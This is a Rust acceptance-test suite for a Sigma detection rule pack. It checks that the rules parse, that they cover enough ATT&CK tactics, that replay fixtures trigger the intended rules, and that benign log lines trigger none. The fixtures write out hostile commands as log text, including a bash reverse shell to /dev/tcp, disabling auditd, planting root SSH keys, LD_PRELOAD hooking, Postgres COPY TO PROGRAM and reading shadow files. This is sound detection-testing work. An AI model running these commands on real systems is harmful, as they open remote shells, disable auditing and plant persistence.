// SPDX-FileCopyrightText: 2026 Vetra Automation AB
// SPDX-License-Identifier: AGPL-3.0-only

//! The day-one pack acceptance suite: the shipped rule tree must LOAD (zero
//! parse errors, >= 50 rules), COVER (>= 8 of the 14 enterprise tactics), and
//! FIRE (replay fixtures prove representative rules match real event shapes —
//! a pack that loads but never fires is the silent-never-match class shipped
//! at scale).

use std::collections::BTreeMap;
use std::path::PathBuf;

use garmr_core::Event;
use garmr_detect::Detector;

fn rules_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules")
}

fn ev(service: &str, message: &str) -> Event {
    Event {
        ts: chrono::Utc::now(),
        host: "pve".into(),
        service: service.into(),
        source: "journald".into(),
        environment: "test".into(),
        severity: "info".into(),
        log_type: "system".into(),
        message: message.into(),
        fields: BTreeMap::new(),
    }
}

fn ev_exe(service: &str, message: &str, exe: &str) -> Event {
    let mut e = ev(service, message);
    e.fields.insert("exe".into(), exe.into());
    e
}

#[test]
fn the_shipped_tree_loads_fifty_plus_rules_with_zero_errors() {
    let collection = rsigma_parser::parse_sigma_directory(&rules_dir()).expect("tree parses");
    assert!(
        collection.errors.is_empty(),
        "shipped rules must carry ZERO parse errors: {:?}",
        collection.errors
    );
    let d = Detector::load(&rules_dir()).expect("detector loads");
    assert!(
        d.rule_count() >= 50,
        "day-one coverage means >= 50 rules; got {}",
        d.rule_count()
    );
}

#[test]
fn the_packs_cover_at_least_eight_tactics() {
    let metas = garmr_detect::rule_metas(&rules_dir()).expect("metas");
    let tactics: std::collections::BTreeSet<String> = metas
        .iter()
        .flat_map(|m| m.tactics.iter().cloned())
        .collect();
    assert!(
        tactics.len() >= 8,
        "coverage in >= 8/14 tactics is the acceptance line; got {}: {tactics:?}",
        tactics.len()
    );
    // And every shipped rule carries at least one technique: an untagged PACK
    // rule (unlike a synthetic detector) has no excuse — it was written with a
    // specific behaviour in mind.
    for m in &metas {
        assert!(
            !m.techniques.is_empty(),
            "pack rule {} ships without an ATT&CK technique",
            m.id
        );
    }
}

#[test]
fn replay_fixtures_fire_the_rules_they_target() {
    let d = Detector::load(&rules_dir()).expect("detector loads");

    // (expected rule id, fixture event) — one per behaviour family, exercising
    // every pack. The fixture messages are REAL log shapes, not the rule's own
    // needle pasted back: a rule that only matches its own description proves
    // nothing.
    let fixtures: Vec<(&str, Event)> = vec![
        (
            "garmr-auth-ssh-root-login",
            ev("sshd", "Accepted password for root from 203.0.113.7 port 51022 ssh2"),
        ),
        (
            "garmr-auth-ssh-max-auth",
            ev("sshd", "error: maximum authentication attempts exceeded for root from 203.0.113.7 port 40022 ssh2 [preauth]"),
        ),
        (
            "garmr-auth-sudo-not-allowed",
            ev("sudo", "eve : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/eve ; COMMAND=/bin/cat /etc/shadow"),
        ),
        (
            "garmr-auth-user-created",
            ev("useradd", "new user: name=backdoor, UID=1013, GID=1013, home=/home/backdoor, shell=/bin/bash"),
        ),
        (
            "garmr-auth-priv-group",
            ev("usermod", "add 'eve' to group 'sudo'"),
        ),
        (
            "garmr-ep-dev-tcp",
            ev("kunai", "bash -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'"),
        ),
        (
            "garmr-ep-exec-tmp",
            ev_exe("kunai", "exec /tmp/.hidden/xmrig", "/tmp/.hidden/xmrig"),
        ),
        (
            "garmr-ep-audit-tamper",
            ev("kunai", "sh -c 'systemctl stop auditd && auditctl -e 0'"),
        ),
        (
            "garmr-ep-authorized-keys",
            ev("kunai", "sh -c 'echo ssh-ed25519 AAAAC3Nz... >> /root/.ssh/authorized_keys'"),
        ),
        (
            "garmr-ep-ld-preload",
            ev("kunai", "LD_PRELOAD=/tmp/hook.so /usr/bin/sshd"),
        ),
        (
            "garmr-pg-superuser",
            ev("postgres", "AUDIT: SESSION,7,1,ROLE,ALTER ROLE,,,ALTER ROLE eve SUPERUSER,<not logged>"),
        ),
        (
            "garmr-pg-copy-program",
            ev("postgres", "AUDIT: SESSION,9,1,MISC,COPY,,,COPY t TO PROGRAM 'id > /tmp/pwn',<not logged>"),
        ),
        (
            "garmr-pg-shadow-read",
            ev("postgres", "AUDIT: SESSION,3,1,READ,SELECT,,,SELECT usename FROM pg_shadow,<not logged>"),
        ),
    ];

    for (want, event) in &fixtures {
        let fired: Vec<String> = d.evaluate(event).into_iter().map(|h| h.rule_id).collect();
        assert!(
            fired.iter().any(|r| r == want),
            "fixture for {want} fired {fired:?} instead\n  message: {}",
            event.message
        );
    }
}

#[test]
fn benign_traffic_fires_nothing() {
    // The other half of day-one credibility: a pack that fires on routine
    // operations is uninstalled by Friday. These are ordinary, healthy lines.
    let d = Detector::load(&rules_dir()).expect("detector loads");
    let benign = vec![
        ev("sshd", "Connection closed by 10.0.0.5 port 51022"),
        ev("systemd", "Started Daily apt download activities."),
        ev("cron", "(root) CMD (command -v debian-sa1 > /dev/null)"),
        ev("kunai", "exec /usr/bin/ls -la /var/log"),
        ev(
            "kunai",
            "curl https://packages.internal.example/os/update.json",
        ),
        ev(
            "postgres",
            "AUDIT: SESSION,2,1,READ,SELECT,,,SELECT id FROM orders WHERE id = 42,<not logged>",
        ),
        ev("useradd", "failed adding user 'x', exit code: 9"),
    ];
    for event in &benign {
        let fired: Vec<String> = d.evaluate(event).into_iter().map(|h| h.rule_id).collect();
        assert!(
            fired.is_empty(),
            "benign line fired {fired:?}\n  message: {}",
            event.message
        );
    }
}
